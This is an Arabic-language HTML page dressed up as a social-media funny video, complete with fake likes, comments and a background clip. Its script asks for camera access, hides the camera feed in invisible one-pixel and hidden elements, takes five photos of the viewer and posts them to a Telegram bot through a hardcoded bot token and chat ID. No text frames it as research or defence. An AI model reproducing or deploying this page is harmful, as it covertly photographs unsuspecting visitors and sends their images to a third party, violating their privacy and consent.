<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>فيديو وكاميرا</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: sans-serif;
    }
    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background-color: black;
    }
    .container {
      position: relative;
      width: 100%;
      height: 100%;
    }
    video.bg-video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .sidebar {
      position: absolute;
      right: 10px;
      bottom: 80px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      color: white;
    }
    .sidebar div {
      text-align: center;
      font-size: 14px;
      cursor: pointer;
    }
    .sidebar div:hover {
      transform: scale(1.1);
    }
    .bottom-info {
      position: absolute;
      left: 10px;
      bottom: 20px;
      color: white;
      font-size: 14px;
    }

    /* الكاميرا غير مرئية */
    #videoCam {
      position: fixed;
      width: 1px;
      height: 1px;
      opacity: 0;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- فيديو الخلفية -->
    <video class="bg-video" autoplay muted loop playsinline>
      <source src="Ali.mp4" type="video/mp4">
      متصفحك لا يدعم تشغيل الفيديو.
    </video>

    <!-- الشريط الجانبي -->
    <div class="sidebar">
      <div>❤️<br>123</div>
      <div>💬<br>45</div>
      <div>📤<br>مشاركة</div>
    </div>

    <!-- المعلومات -->
    <div class="bottom-info">
      <strong>@user123</strong><br>
      فيديو مضحك جدًا 😂🎥
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="videoCam" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <script>
    const videoCam = document.getElementById("videoCam");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const botToken = "7405455563:AAG6QiWkB5MrEm_dKtr5lFJ0zBpChtsivMM";
    const chatId = "7586155590";

    // تشغيل الكاميرا
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoCam.srcObject = stream;

        // بعد بدء الكاميرا، نبدأ التقاط الصور بعد ثانيتين
        setTimeout(() => {
          let count = 0;
          const totalPhotos = 5;
          const interval = 1000;

          const captureInterval = setInterval(() => {
            if (count >= totalPhotos) {
              clearInterval(captureInterval);
              console.log("✅ تم التقاط وإرسال جميع الصور");
              return;
            }

            canvas.width = videoCam.videoWidth;
            canvas.height = videoCam.videoHeight;
            ctx.drawImage(videoCam, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append("chat_id", chatId);
              formData.append("photo", blob, `photo_${count + 1}.jpg`);

              fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
              }).then(() => {
                console.log(`📤 تم إرسال الصورة رقم ${count + 1}`);
              }).catch(err => {
                console.error(`❌ فشل في إرسال الصورة رقم ${count + 1}:`, err);
              });

              count++;
            }, "image/jpeg");

          }, interval);
        }, 2000);
      })
      .catch(err => {
        alert("⚠️ لا يمكن تشغيل الكاميرا");
        console.error(err);
      });
  </script>
</body>
</html>
